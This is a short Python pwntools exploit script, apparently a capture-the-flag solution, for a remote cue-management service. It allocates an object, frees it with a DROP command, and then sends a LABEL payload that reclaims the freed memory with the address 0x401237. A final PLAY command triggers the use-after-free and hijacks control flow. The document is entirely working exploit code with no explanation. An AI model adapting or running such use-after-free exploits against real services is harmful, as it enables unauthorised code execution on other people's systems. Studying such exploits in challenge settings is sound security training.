from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

ENCORE = 0x401237

def build_label_payload(addr, total_size=40):
    data = p64(addr)
    data += b'\x00' * (total_size - len(data))
    return total_size, data.hex()

def run(io):
    io.recvuntil(b'Commands:')
    io.recvline()

    io.sendline(b'NEW cueA')
    print(io.recvline())

    io.sendline(b'SELECT 0')
    print(io.recvline())

    io.sendline(b'DROP 0')
    print(io.recvline())

    size, hexdata = build_label_payload(ENCORE, 40)
    cmd = f'LABEL {size} {hexdata}'.encode()
    io.sendline(cmd)
    print(io.recvline())

    io.sendline(b'PLAY')
    out = io.recvall(timeout=5)
    print(out.decode(errors='replace'))

if __name__ == '__main__':
    host = sys.argv[1]
    port = int(sys.argv[2])
    io = remote(host, port)
    run(io)